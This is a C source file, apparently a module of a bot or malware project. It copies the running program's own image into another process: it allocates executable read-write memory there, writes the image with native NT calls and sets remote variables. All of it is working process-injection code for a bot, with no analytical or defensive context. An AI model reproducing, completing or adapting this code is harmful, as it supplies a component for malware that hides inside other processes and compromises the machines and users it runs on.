#include "inject.h"

extern bot_t bot;

DWORD GetImageSize(DWORD dwBaseAddress)
{
	PIMAGE_OPTIONAL_HEADER pIoh;
	PIMAGE_DOS_HEADER pIdh;
	DWORD dwOffset;

	pIdh = (PIMAGE_DOS_HEADER)dwBaseAddress;
	dwOffset = dwBaseAddress + (DWORD)pIdh->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
	pIoh = (PIMAGE_OPTIONAL_HEADER)dwOffset;

	return pIoh->SizeOfImage;
}

BOOL CopyImageToProcess(HANDLE hProcess, DWORD dwBaseAddress)
{
	DWORD dwImageSize, dwFree;
	LPVOID lpNewBase;

	dwImageSize = GetImageSize(dwBaseAddress);

	lpNewBase = (LPVOID)dwBaseAddress;

	if(!(CWA(NtAllocateVirtualMemory)(hProcess, &lpNewBase, 0, &dwImageSize, PAGE_EXECUTE_READWRITE, MEM_COMMIT | MEM_RESERVE) >= 0))
		return FALSE;

	if(!(CWA(NtWriteVirtualMemory)(hProcess, lpNewBase, dwBaseAddress, dwImageSize, NULL) >= 0))
	{
		CWA(NtFreeVirtualMemory)(hProcess, &lpNewBase, &dwFree, MEM_RELEASE);
		return FALSE;
	}

	return TRUE;
}

BOOL SetRemoteVariable(HANDLE hProcess, LPVOID lpDestination, LPVOID lpSource)
{
	return CWA(NtWriteVirtualMemory)(hProcess, lpDestination, lpSource, sizeof(LPVOID), NULL) >= 0 ? TRUE : FALSE;
}